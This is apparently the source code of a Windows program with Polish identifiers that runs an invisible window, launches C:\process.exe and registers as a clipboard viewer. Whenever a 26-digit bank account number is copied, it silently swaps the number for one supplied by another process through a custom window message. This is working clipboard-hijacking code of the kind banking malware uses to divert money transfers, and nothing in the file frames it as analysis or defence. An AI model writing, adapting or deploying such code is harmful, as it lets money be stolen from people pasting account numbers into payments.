#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
using namespace std;
static HWND hwndNxtVwr;

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
void konwertuj(char* tab, long long cz1, long long cz2);
bool czyNrKonta(char* tekst);

char gmsg[27] = "";
COPYDATASTRUCT* pcds;
LPCTSTR lpszString;
long long cz1;
long long cz2;
int start = 0;
void schowek();

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {

    const wchar_t CLASS_NAME[] = L"Sample Window Class";
    WNDCLASS wc = { };
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;
    RegisterClass(&wc);
    HWND hwnd = CreateWindowEx(0, CLASS_NAME, L"OknoK1", WS_OVERLAPPEDWINDOW,
    CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, NULL, NULL, hInstance, NULL);

    if (hwnd == NULL) {
        return 0;
    }
    
    
    //ShowWindow(hwnd, nCmdShow);
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    CreateProcess(L"C:\\process.exe",
        NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);   
        
        
    MSG msg;
    while (GetMessage(&msg, (HWND)NULL, 0, 0)) {
        // id = GetCurrentProcessId();
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	switch (message) {
    case WM_CREATE:
        hwndNxtVwr = SetClipboardViewer(hwnd);
        return (0);

    case WM_DESTROY:
        ChangeClipboardChain(hwnd, hwndNxtVwr);
        PostQuitMessage(0);
        return (0);

	case WM_DRAWCLIPBOARD:
        schowek();
		return (0);
    case 2345:
        cz1 = wParam;
        cz2 = lParam;
        konwertuj(gmsg, cz1, cz2);
        return(0);
	default:
		return DefWindowProc(hwnd, message, wParam, lParam);
	}
}

void schowek() {
    if (start == 1) {
        if (IsClipboardFormatAvailable(CF_TEXT))
        {
            OpenClipboard(NULL);
            HWND hwnd = GetConsoleWindow();
            HANDLE hCbMem = GetClipboardData(CF_TEXT);
            HANDLE hProgMem = GlobalAlloc(GHND, GlobalSize(hCbMem));
            if (hProgMem != NULL) {

                LPSTR lpCbMem = (LPSTR)GlobalLock(hCbMem);
                LPSTR lpProgMem = (LPSTR)GlobalLock(hProgMem);
                strcpy(lpProgMem, lpCbMem);
                GlobalUnlock(hCbMem);
                GlobalUnlock(hProgMem);
                CloseClipboard();

                char schowek[1024] = { '\0' };
                strcpy(schowek, lpProgMem);

                if (czyNrKonta(schowek)) {
                    HGLOBAL hGlMem = GlobalAlloc(GHND, (DWORD)27);
                    LPVOID lpGlMem = GlobalLock(hGlMem);
                    memcpy(lpGlMem, gmsg, 27);
                    GlobalUnlock(hGlMem);
                    OpenClipboard(hwnd);
                    EmptyClipboard();
                    SetClipboardData(CF_TEXT, hGlMem);
                    CloseClipboard();
                }
            }
        }
    }
    else start = 1;
}

bool czyNrKonta(char* tekst) {
    int iloscCyfr = 0;
    int dlugoscTekstu = strlen(tekst);
    for (int i = 0; i < dlugoscTekstu; i++) {
        if ((tekst[i] < '0' || tekst[i] > '9') && (tekst[i] != ' ')) {
            return false;
        }
        else {
            if (tekst[i] != ' ') {
                iloscCyfr++;
            }
        }
    }
    if (iloscCyfr == 26)
        return true;
    return false;
}


void konwertuj(char* tab, long long cz1, long long cz2) {
    for (int i = 0; i < 13; i++) {
        tab[25 - i] = cz2 % 10 + '0';
        cz2 /= 10;
    }

    for (int i = 0; i < 13; i++) {
        tab[12 - i] = cz1 % 10 + '0';
        cz1 /= 10;
    }
}